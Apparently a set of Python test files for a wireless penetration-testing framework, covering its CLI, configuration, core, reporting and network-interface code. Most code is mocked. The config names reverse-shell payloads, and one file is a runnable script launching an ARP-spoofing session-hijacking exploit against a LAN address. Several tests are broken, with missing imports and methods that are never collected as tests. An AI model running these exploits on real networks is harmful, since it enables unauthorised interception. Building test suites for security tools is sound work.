            'description': 'Credential extraction successful',
            'action': 'Extracted credentials'
        }]
    }

    # Mock os.makedirs to prevent actual directory creation
    mocker.patch('os.makedirs')

    # Mock the open function for writing the TXT report
    mock_open_write = mocker.mock_open()
    mocker.patch('builtins.open', mock_open_write)

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['report', '--format', 'txt'])

    # Assert exit code
    assert result.exit_code == 0

    # Construct expected path with os.path.normpath
    expected_path = os.path.normpath('/path/to/reports/txt/report.txt')

    # Assert output contains expected message
    expected_message = f"TXT report exported to {expected_path}"
    assert expected_message in result.output

    # Assert that the report was written correctly
    mock_open_write.assert_called_once_with(expected_path, 'w')
    handle = mock_open_write()

    # Construct expected report with OS-specific line separators
    expected_report = (
        f"Scanner: scan1{os.linesep}"
        f"  - SSID: TestSSID{os.linesep}"
        f"    BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Protocol: WPA2{os.linesep}"
        f"    Description: Weak encryption{os.linesep}"
        f"Exploit: exploit1{os.linesep}"
        f"  - BSSID: AA:BB:CC:DD:EE:FF{os.linesep}"
        f"    Description: Credential extraction successful{os.linesep}"
        f"    Action: Extracted credentials{os.linesep}"
    )

    handle.write.assert_called_once_with(expected_report)


def test_list_command_shows_available_scanners_and_exploits(mocker, mock_coreframework):
    """
    Test that the 'list' command displays all available scanners and exploits.
    """
    # Configure the mock scanners and exploits
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['list'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains available scanners
    assert "\nAvailable Scanners:" in result.output
    assert "- encryption_scanner" in result.output
    assert "- auth_bypass_scanner" in result.output

    # Assert output contains available exploits
    assert "\nAvailable Exploits:" in result.output
    assert "- session_hijacking" in result.output
    assert "- credential_extraction" in result.output


if __name__ == '__main__':
    import pytest

    pytest.main()


# tests/test_config_manager.py
import unittest
import os
import shutil
from core.config_manager import ConfigManager
from pydantic import ValidationError


class TestConfigManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "INFO",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 20
                }
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Set environment variables to override configurations
        os.environ['GENERAL_LOG_LEVEL'] = 'DEBUG'
        os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION'] = '15'

    def tearDown(self):
        # Remove temporary config directory and environment variables
        shutil.rmtree(self.test_config_dir)
        del os.environ['GENERAL_LOG_LEVEL']
        del os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION']

    def test_load_config(self):
        cm = ConfigManager(config_dir=self.test_config_dir)
        config = cm.get_config()

        # Test overridden general.interface
        self.assertEqual(config.general.interface, "wlan1mon")

        # Test overridden scanners.encryption_scanner.scan_duration
        self.assertEqual(config.scanners.encryption_scanner.scan_duration, 20)

        # Test environment variable override for general.log_level
        self.assertEqual(config.general.log_level, "DEBUG")

        # Test environment variable override for exploits.payload_delivery.default_duration
        self.assertEqual(config.exploits.payload_delivery.default_duration, 15)

        # Test default values that were not overridden
        self.assertEqual(config.scanners.auth_bypass_scanner.scan_duration, 10)
        self.assertEqual(config.exploits.credential_extraction.capture_duration, 20)
        self.assertEqual(config.ui.theme, "default")

    def test_invalid_config(self):
        # Write invalid log_level
        with open(os.path.join(self.test_config_dir, "config.yaml"), 'a') as f:
            f.write("\ngeneral:\n  log_level: 'VERBOSE'\n")

        with self.assertRaises(ValidationError):
            cm = ConfigManager(config_dir=self.test_config_dir)
            cm.get_config()


if __name__ == '__main__':
    unittest.main()


# tests/test_core.py
# tests/test_core.py
import time

import pytest
from unittest import mock
from unittest.mock import MagicMock, mock_open, call
import json
from core import CoreFramework
import os
import threading


# Fixture to mock ConfigManager
@pytest.fixture
def mock_config_manager(mocker):
    mock_config = mocker.Mock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/tmp/reports'
    mock_config.scanners.encryption_scanner.scan_duration = 5
    mock_config.scanners.auth_bypass_scanner.scan_duration = 5
    mock_config.scanners.local_scanner.scan_duration = 5
    mock_config.exploits.session_hijacking.max_packets = 100
    return mock_config


# Fixture to mock vulnerabilities.json
@pytest.fixture
def mock_vulnerabilities(mocker):
    mock_vuln_data = {
        "vuln1": [{"detail": "Sample vulnerability 1"}],
        "vuln2": [{"detail": "Sample vulnerability 2"}]
    }
    mocked_open = mocker.patch("builtins.open", mock_open(read_data=json.dumps(mock_vuln_data)))
    return mock_vuln_data


# Fixture to mock external utilities
@pytest.fixture
def mock_utilities(mocker):
    mock_network_manager = mocker.Mock()
    mock_network_manager.interface = 'wlan0mon'

    mock_data_storage_manager = mocker.Mock()
    mock_data_storage_manager.generate_report = mocker.Mock()

    mock_auth_tools = mocker.Mock()

    return {
        "network_manager": mock_network_manager,
        "data_storage_manager": mock_data_storage_manager,
        "auth_tools": mock_auth_tools
    }


# Fixture to mock scanners
@pytest.fixture
def mock_scanners(mocker):
    mock_encryption_scanner = mocker.Mock()
    mock_auth_bypass_scanner = mocker.Mock()
    mock_dos_scanner = mocker.Mock()
    mock_local_scanner = mocker.Mock()

    scanners = {
        'encryption_scanner': mock_encryption_scanner,
        'auth_bypass_scanner': mock_auth_bypass_scanner,
        'dos_scanner': mock_dos_scanner,
        'local_scanner': mock_local_scanner
    }
    return scanners


# Fixture to mock exploits
@pytest.fixture
def mock_exploits(mocker):
    mock_session_hijacking = mocker.Mock()
    mock_credential_extraction = mocker.Mock()
    mock_payload_delivery = mocker.Mock()

    exploits = {
        'session_hijacking': mock_session_hijacking,
        'credential_extraction': mock_credential_extraction,
        'payload_delivery': mock_payload_delivery
    }
    return exploits


# Fixture to create a CoreFramework instance with all dependencies mocked
@pytest.fixture
def core_framework(mocker, mock_config_manager, mock_vulnerabilities, mock_utilities, mock_scanners, mock_exploits):
    # Mock ConfigManager
    mock_config_manager_instance = mocker.Mock()
    mock_config_manager_instance.get_config.return_value = mock_config_manager
    mocker.patch('core.config_manager.ConfigManager', return_value=mock_config_manager_instance)

    # Mock external utilities
    mocker.patch('core.NetworkInterfaceManager', return_value=mock_utilities['network_manager'])
    mocker.patch('core.DataStorageManager', return_value=mock_utilities['data_storage_manager'])
    mocker.patch('core.AuthenticationTools', return_value=mock_utilities['auth_tools'])

    # Mock scanners
    mocker.patch('core.scanners.encryption_scanner.EncryptionWeaknessScanner',
                 return_value=mock_scanners['encryption_scanner'])
    mocker.patch('core.scanners.auth_bypass_scanner.AuthBypassScanner',
                 return_value=mock_scanners['auth_bypass_scanner'])
    mocker.patch('core.scanners.dos_scanner.DosScanner', return_value=mock_scanners['dos_scanner'])
    mocker.patch('core.scanners.local_scanner.LocalScanner', return_value=mock_scanners['local_scanner'])

    # Mock exploits
    mocker.patch('core.exploits.session_hijacking.SessionHijacking', return_value=mock_exploits['session_hijacking'])
    mocker.patch('core.exploits.credential_extraction.CredentialExtraction',
                 return_value=mock_exploits['credential_extraction'])
    mocker.patch('core.exploits.payload_delivery.PayloadDelivery', return_value=mock_exploits['payload_delivery'])

    # Initialize CoreFramework
    core = CoreFramework(modules_path='/path/to/modules', config_dir='/path/to/config')

    return core


# Test CoreFramework Initialization
def test_coreframework_initialization(core_framework, mock_config_manager, mock_vulnerabilities, mock_utilities,
                                      mock_scanners, mock_exploits):
    # Assert that ConfigManager was initialized with correct config_dir
    core_framework.config_manager.get_config.assert_called_once()

    # Assert that vulnerabilities were loaded correctly
    assert core_framework.vulnerability_db == mock_vulnerabilities

    # Assert that utilities were initialized correctly
    assert core_framework.network_manager.interface == 'wlan0mon'
    assert core_framework.data_storage_manager == mock_utilities['data_storage_manager']
    assert core_framework.auth_tools == mock_utilities['auth_tools']

    # Assert that scanners were initialized correctly
    assert core_framework.scanners['encryption_scanner'] == mock_scanners['encryption_scanner']
    assert core_framework.scanners['auth_bypass_scanner'] == mock_scanners['auth_bypass_scanner']
    assert core_framework.scanners['dos_scanner'] == mock_scanners['dos_scanner']
    assert core_framework.scanners['local_scanner'] == mock_scanners['local_scanner']

    # Assert that exploits were initialized correctly
    assert core_framework.exploits['session_hijacking'] == mock_exploits['session_hijacking']
    assert core_framework.exploits['credential_extraction'] == mock_exploits['credential_extraction']
    assert core_framework.exploits['payload_delivery'] == mock_exploits['payload_delivery']


# Test load_protocol_modules is called during initialization
def test_load_protocol_modules_called(core_framework, mocker):
    mock_load = mocker.spy(core_framework, 'load_protocol_modules')
    # Re-initialize CoreFramework to trigger load_protocol_modules
    core = CoreFramework(modules_path='/path/to/modules', config_dir='/path/to/config')
    core.load_protocol_modules()
    mock_load.assert_called_once()


# Test run_scanner with valid scanner
def test_run_scanner_valid(core_framework, mock_scanners):
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    mock_scanners['encryption_scanner'].scan.return_value = {'vuln3': [{'detail': 'Sample vulnerability 3'}]}

    core_framework.run_scanner('encryption_scanner', target_info)

    mock_scanners['encryption_scanner'].scan.assert_called_once_with(target_info)
    assert core_framework.vulnerability_db['vuln3'] == [{'detail': 'Sample vulnerability 3'}]


# Test run_scanner with invalid scanner
def test_run_scanner_invalid(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        core_framework.run_scanner('invalid_scanner', {})
        mock_logger_error.assert_called_once_with("Scanner 'invalid_scanner' not found.")


# Test run_exploit with valid exploit
def test_run_exploit_valid(core_framework, mock_exploits):
    vuln_info = {'key': 'value'}
    mock_exploits['session_hijacking'].execute.return_value = {'vuln4': [{'detail': 'Sample vulnerability 4'}]}

    core_framework.run_exploit('session_hijacking', vuln_info)

    mock_exploits['session_hijacking'].execute.assert_called_once_with(vuln_info)
    assert core_framework.vulnerability_db['vuln4'] == [{'detail': 'Sample vulnerability 4'}]


# Test run_exploit with invalid exploit
def test_run_exploit_invalid(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        core_framework.run_exploit('invalid_exploit', {})
        mock_logger_error.assert_called_once_with("Exploit 'invalid_exploit' not found.")


# Test send_continuous_packets and stop_continuous_packets
def test_send_continuous_packets(core_framework, mocker):
    packet = mocker.Mock()
    interval = 0.1  # 100ms for testing

    # Mock sendp and time.sleep
    mock_sendp = mocker.patch('core.sendp')
    mock_sleep = mocker.patch('core.time.sleep', return_value=None)

    # Start sending packets in a separate thread
    send_thread = threading.Thread(target=core_framework.send_continuous_packets, args=(packet, interval))
    send_thread.start()

    # Allow some time for packets to be sent
    time_to_send = 0.35  # Approximately 3 packets
    time.sleep(time_to_send)

    # Stop sending packets
    core_framework.stop_continuous_packets()
    send_thread.join()

    # Assert that sendp was called approximately 3 times
    assert mock_sendp.call_count >= 3


# Test finalize method
def test_finalize(core_framework, mocker):
    # Mock generate_report
    mock_generate_report = mocker.patch.object(core_framework.data_storage_manager, 'generate_report')

    # Call finalize
    core_framework.finalize()

    # Assert that generate_report was called with vulnerability_db
    mock_generate_report.assert_called_once_with(core_framework.vulnerability_db)


# Test load_protocol_modules method (even though it's a placeholder)
def test_load_protocol_modules(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'info') as mock_logger_info:
        core_framework.load_protocol_modules()
        mock_logger_info.assert_called_with(
            f"Loading protocol modules from {core_framework.config_manager.config_dir}/protocols...")


# Test that finalize handles exceptions gracefully
def test_finalize_exception(core_framework, mocker):
    # Mock generate_report to raise an exception
    mock_generate_report = mocker.patch.object(core_framework.data_storage_manager, 'generate_report',
                                               side_effect=Exception("Report generation failed"))
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        with mocker.patch('core.click.echo') as mock_click_echo:
            core_framework.finalize()
            mock_logger_error.assert_not_called()  # Because finalize doesn't log errors
            mock_click_echo.assert_called_with("Error during finalization: Report generation failed")


# tests/test_data_storage_manager.py
import unittest
from unittest.mock import patch, mock_open
from project_specifc_utils.data_storage_manager import DataStorageManager
import os
import shutil
import json
import logging


class TestDataStorageManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary report directory
        self.test_report_dir = "test_reports"
        self.data_storage_manager = DataStorageManager(report_directory=self.test_report_dir)

    def tearDown(self):
        # Remove temporary report directory after tests
        shutil.rmtree(self.test_report_dir)

    def test_save_and_load_json(self):
        test_data = {'key': 'value'}
        filename = 'test.json'
        self.data_storage_manager.save_json(test_data, filename)

        # Ensure the file exists
        json_path = os.path.join(self.test_report_dir, 'json', filename)
        self.assertTrue(os.path.exists(json_path))

        # Load the data and verify
        loaded_data = self.data_storage_manager.load_json(filename)
        self.assertEqual(test_data, loaded_data)

    def test_save_text(self):
        test_text = "This is a test."
        filename = 'test.txt'
        self.data_storage_manager.save_text(test_text, filename)

        # Ensure the file exists
        text_path = os.path.join(self.test_report_dir, 'txt', filename)
        self.assertTrue(os.path.exists(text_path))

        # Read the file and verify
        with open(text_path, 'r') as f:
            content = f.read()
        self.assertEqual(test_text, content)

    def test_save_binary(self):
        test_binary = b'\x00\xFF\x00\xFF'
        filename = 'test.bin'
        self.data_storage_manager.save_binary(test_binary, filename)

        # Ensure the file exists
        binary_path = os.path.join(self.test_report_dir, 'binary', filename)
        self.assertTrue(os.path.exists(binary_path))

        # Read the file and verify
        with open(binary_path, 'rb') as f:
            content = f.read()
        self.assertEqual(test_binary, content)

    def test_get_report_path_valid(self):
        filename = 'report.json'
        path = self.data_storage_manager.get_report_path('json', filename)
        expected_path = os.path.join(self.test_report_dir, 'json', filename)
        self.assertEqual(path, expected_path)

    def test_get_report_path_invalid(self):
        filename = 'report.xyz'
        with self.assertRaises(ValueError):
            self.data_storage_manager.get_report_path('invalid_type', filename)


if __name__ == '__main__':
    unittest.main()


# tests/test_event_dispatcher.py
import unittest
from unittest.mock import MagicMock
from core.event_dispatcher import EventDispatcher

class TestEventDispatcher(unittest.TestCase):
    def setUp(self):
        self.dispatcher = EventDispatcher()
        self.callback = MagicMock()

    def subscribes_callback_to_event_type(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.assertIn(self.callback, self.dispatcher.listeners['test_event'])

    def unsubscribes_callback_from_event_type(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.unsubscribe('test_event', self.callback)
        self.assertNotIn(self.callback, self.dispatcher.listeners['test_event'])

    def dispatches_event_to_subscribed_callbacks(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.dispatch('test_event', 42, key='value')
        self.callback.assert_called_once_with(42, key='value')

    def does_not_dispatch_event_to_unsubscribed_callbacks(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.unsubscribe('test_event', self.callback)
        self.dispatcher.dispatch('test_event', 42, key='value')
        self.callback.assert_not_called()

    def handles_exception_in_callback_gracefully(self):
        def faulty_callback(*args, **kwargs):
            raise ValueError("An error occurred")

        self.dispatcher.subscribe('test_event', faulty_callback)
        self.dispatcher.dispatch('test_event')
        self.assertTrue(self.dispatcher.logger.error.called)


if __name__ == '__main__':
    unittest.main()
# The EventDispatcher class is a simple
# implementation of the observer pattern.
# It allows objects to subscribe to specific

# events and receive notifications when


# tests/test_exploits.py
from core import CoreFramework
import os
import time
import logging

def main():
    # Define the path to the protocols/modules directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    protocols_path = os.path.join(current_dir, '../protocols')

    # Initialize the Core Framework
    core = CoreFramework(protocols_path)

    # Load protocol modules
    core.load_protocol_modules()

    # Load vulnerability database
    # Already loaded in CoreFramework initialization

    # Define the target vulnerability
    vulnerability = {
        'type': 'session_hijacking',
        'description': 'Exploits ARP spoofing to hijack sessions.',
        'target_session': {
            'target_ip': '192.168.1.10',
            'target_mac': 'AA:BB:CC:DD:EE:FF',
            'gateway_ip': '192.168.1.1',
            'gateway_mac': '11:22:33:44:55:66'
        },
        'max_packets': 100
    }

    # Run Session Hijacking exploit
    core.run_exploit('session_hijacking', vulnerability)

if __name__ == "__main__":
    # Configure logging to display debug information
    logging.basicConfig(
        level=logging.DEBUG,
        format='[%(asctime)s] %(levelname)s - %(name)s - %(message)s',
        handlers=[
            logging.StreamHandler()
        ]
    )
    main()


# tests/test_integration_config.py
import unittest
import os
import shutil
from core.config_manager import ConfigManager
from core import CoreFramework


class TestIntegrationConfig(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "INFO",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 20
                }
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Set environment variables to override configurations
        os.environ['GENERAL_LOG_LEVEL'] = 'DEBUG'
        os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION'] = '15'

        # Initialize Core Framework
        self.core = CoreFramework(modules_path=os.path.join(os.getcwd(), 'protocols'), config_path=self.test_config_dir)

    def tearDown(self):
        # Remove temporary config directory and environment variables
        shutil.rmtree(self.test_config_dir)
        del os.environ['GENERAL_LOG_LEVEL']
        del os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION']

    def test_core_configuration(self):
        # Access Core Framework configuration
        config = self.core.config

        # Verify general settings
        self.assertEqual(config.general.interface, "wlan1mon")
        self.assertEqual(config.general.log_level, "DEBUG")
        self.assertEqual(config.general.report_directory, "reports")

        # Verify scanner settings
        self.assertEqual(config.scanners.encryption_scanner.scan_duration, 20)
        self.assertEqual(config.scanners.auth_bypass_scanner.scan_duration, 10)
        self.assertEqual(config.scanners.dos_scanner.scan_duration, 10)

        # Verify exploit settings
        self.assertEqual(config.exploits.session_hijacking.max_packets, 100)
        self.assertEqual(config.exploits.credential_extraction.capture_duration, 20)
        self.assertEqual(config.exploits.payload_delivery.default_duration, 15)
        self.assertListEqual(config.exploits.payload_delivery.payload_types, ["reverse_shell", "malicious_script"])

        # Verify UI settings
        self.assertEqual(config.ui.theme, "default")

    def test_invalid_core_configuration(self):
        # Write invalid log_level
        with open(os.path.join(self.test_config_dir, "config.yaml"), 'a') as f:
            f.write("\ngeneral:\n  log_level: 'VERBOSE'\n")

        with self.assertRaises(Exception):
            self.core = CoreFramework(modules_path=os.path.join(os.getcwd(), 'protocols'),
                                      config_path=self.test_config_dir)


if __name__ == '__main__':
    unittest.main()


# tests/test_log_manager.py
import unittest
import os
from core.config_manager import ConfigManager
from core.log_manager import LogManager
import logging


class TestLogManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "DEBUG",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon",
                "log_level": "INFO"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Initialize Config Manager
        self.config_manager = ConfigManager(config_dir=self.test_config_dir)

        # Initialize Log Manager
        self.log_manager = LogManager(self.config_manager)
        self.logger = logging.getLogger('TestLogger')
        self.logger.setLevel(logging.DEBUG)

    def tearDown(self):
        # Remove temporary config directory
        shutil.rmtree(self.test_config_dir)

        # Remove log handlers
        handlers = self.logger.handlers[:]
        for handler in handlers:
            handler.close()
            self.logger.removeHandler(handler)

    def test_logging_output(self):
        # Log messages
        self.logger.debug("This is a DEBUG message.")
        self.logger.info("This is an INFO message.")
        self.logger.warning("This is a WARNING message.")
        self.logger.error("This is an ERROR message.")
        self.logger.critical("This is a CRITICAL message.")

        # Check if log file exists
        log_file = os.path.join(self.config_manager.get_config().general.report_directory, '..', 'logs', 'app.log')
        self.assertTrue(os.path.exists(log_file))

        # Read log file and verify contents
        with open(log_file, 'r') as f:
            logs = f.read()
            self.assertIn("This is a DEBUG message.", logs)
            self.assertIn("This is an INFO message.", logs)
            self.assertIn("This is a WARNING message.", logs)
            self.assertIn("This is an ERROR message.", logs)
            self.assertIn("This is a CRITICAL message.", logs)


if __name__ == '__main__':
    unittest.main()


# tests/test_network_interface_manager.py
import unittest
from unittest.mock import patch, MagicMock
from project_specifc_utils.network_interface_manager import NetworkInterfaceManager
import logging

class TestNetworkInterfaceManager(unittest.TestCase):
    def setUp(self):
        # Set up the logger to capture log outputs for assertions
        self.logger = logging.getLogger('NetworkInterfaceManager')
        self.logger.setLevel(logging.DEBUG)
        self.network_manager = NetworkInterfaceManager()

    @patch('project_specifc_utils.network_interface_manager.subprocess.run')
    def test_enable_monitor_mode_success(self, mock_run):
        # Mock successful execution of airmon-ng commands
        mock_run.return_value = subprocess.CompletedProcess(args=['airmon-ng', 'start', 'wlan0'], returncode=0, stdout='Monitor mode enabled', stderr='')

        try:
            self.network_manager.enable_monitor_mode('wlan0')
        except Exception as e:
            self.fail(f"enable_monitor_mode raised an exception {e}")

        # Ensure commands were called correctly
        expected_calls = [
            patch.call(['sudo', 'airmon-ng', 'check', 'kill'], check=True, stdout=patch.ANY, stderr=patch.ANY, text=True),
            patch.call(['sudo', 'airmon-ng', 'start', 'wlan0'], check=True, stdout=patch.ANY, stderr=patch.ANY, text=True)
        ]
        self.assertEqual(mock_run.call_count, 2)

    @patch('project_specifc_utils.network_interface_manager.subprocess.run')
    def test_enable_monitor_mode_failure(self, mock_run):
        # Mock failure in airmon-ng start command
        mock_run.side_effect = subprocess.CalledProcessError(returncode=1, cmd=['sudo', 'airmon-ng', 'start', 'wlan0'], stderr='Failed to start monitor mode')

        with self.assertRaises(subprocess.CalledProcessError):
            self.network_manager.enable_monitor_mode('wlan0')

    @patch('project_specifc_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_monitor(self, mock_run):
        # Mock iwconfig output indicating monitor mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0mon'], returncode=0, stdout='wlan0mon    IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz  Tx-Power=20 dBm\n', stderr='')

        status = self.network_manager.get_interface_status('wlan0mon')
        self.assertEqual(status, "Monitor Mode")

    @patch('project_specifc_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_managed(self, mock_run):
        # Mock iwconfig output indicating managed mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0'], returncode=0, stdout='wlan0     IEEE 802.11  ESSID:"TestNetwork"  Nickname:"<WIFI@REALTEK>\n Mode:Managed  Frequency:2.437 GHz  Access Point: 00:11:22:33:44:55 \n', stderr='')

        status = self.network_manager.get_interface_status('wlan0')
        self.assertEqual(status, "Managed Mode")

    @patch('project_specifc_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_unknown(self, mock_run):
        # Mock iwconfig output with unknown mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0'], returncode=0, stdout='wlan0     IEEE 802.11  ESSID:"TestNetwork"\n Mode:Unknown\n', stderr='')

        status = self.network_manager.get_interface_status('wlan0')
        self.assertEqual(status, "Unknown")

if __name__ == '__main__':
    unittest.main()


# tests/test_report_generator.py
import unittest
import os
from core.config_manager import ConfigManager
from core.log_manager import LogManager
from core.report_generator import ReportGenerator
from scanners.encryption_scanner import EncryptionWeaknessScanner
from exploits.session_hijacking import SessionHijacking
import shutil
import logging


class TestReportGenerator(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "DEBUG",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Initialize Config Manager
        self.config_manager = ConfigManager(config_dir=self.test_config_dir)

        # Initialize Log Manager
        self.log_manager = LogManager(self.config_manager)

        # Initialize Scanners and Exploits with mock data
        self.encryption_scanner = EncryptionWeaknessScanner(None,
                                                            self.config_manager.get_config().scanners.encryption_scanner.dict())
        self.encryption_scanner.detected_vulnerabilities = [
            {
                'ssid': 'TestNetwork',
                'bssid': '00:11:22:33:44:55',
                'protocol': 'WEP',
                'description': 'Weak encryption detected.',
                'action': 'Upgrade to WPA2.'
            }
        ]

        self.session_hijacking = SessionHijacking(None,
                                                  self.config_manager.get_config().exploits.session_hijacking.dict())
        self.session_hijacking.detected_vulnerabilities = [
            {
                'target': '192.168.1.10',
                'description': 'Session hijacking successful.',
                'status': 'Compromised',
                'action_taken': 'Gained unauthorized access.'
            }
        ]

        self.scanners = {
            'encryption_scanner': self.encryption_scanner
        }

        self.exploits = {
            'session_hijacking': self.session_hijacking
        }

        # Initialize Report Generator
        self.report_generator = ReportGenerator(self.config_manager.get_config(), self.scanners, self.exploits)
        self.report_generator.create_html_template()

    def tearDown(self):
        # Remove temporary config directory
        shutil.rmtree(self.test_config_dir)

        # Remove report files
        report_dir = os.path.join(os.getcwd(), 'reports')
        if os.path.exists(report_dir):
            shutil.rmtree(report_dir)

    def test_generate_json_report(self):
        self.report_generator.generate_reports()
        json_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'json',
                                        'report.json')
        self.assertTrue(os.path.exists(json_report_path))

        with open(json_report_path, 'r') as f:
            report_data = json.load(f)
            self.assertIn('scanners', report_data)
            self.assertIn('exploits', report_data)
            self.assertIn('encryption_scanner', report_data['scanners'])
            self.assertIn('session_hijacking', report_data['exploits'])
            self.assertEqual(len(report_data['scanners']['encryption_scanner']['results']), 1)
            self.assertEqual(len(report_data['exploits']['session_hijacking']['results']), 1)

    def test_generate_html_report(self):
        self.report_generator.generate_reports()
        html_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'html',
                                        'report.html')
        self.assertTrue(os.path.exists(html_report_path))

        with open(html_report_path, 'r') as f:
            html_content = f.read()
            self.assertIn('<h1>WirelessPenTestLib Report</h1>', html_content)
            self.assertIn('Encryption Weakness Scan', html_content)
            self.assertIn('Session Hijacking', html_content)
            self.assertIn('Weak encryption detected.', html_content)
            self.assertIn('Session hijacking successful.', html_content)

    def test_generate_pdf_report(self):
        # Ensure wkhtmltopdf is installed; skip test if not
        try:
            import pdfkit
            self.report_generator.generate_reports()
            pdf_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'pdf',
                                           'report.pdf')
            self.assertTrue(os.path.exists(pdf_report_path))
        except OSError:
            self.skipTest("wkhtmltopdf not installed. Skipping PDF report generation test.")


if __name__ == '__main__':
    unittest.main()


# tests/test_wep_scanner.py
# tests/test_wep_scanner.py

import unittest
from unittest.mock import MagicMock, patch
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from scanners.wep_scanner import WEPScanner
import threading


class TestWEPScanner(unittest.TestCase):
    def setUp(self):
        # Mock CoreFramework with a mock logger and network_manager
        self.mock_core_framework = MagicMock()
        self.mock_core_framework.logger = MagicMock()
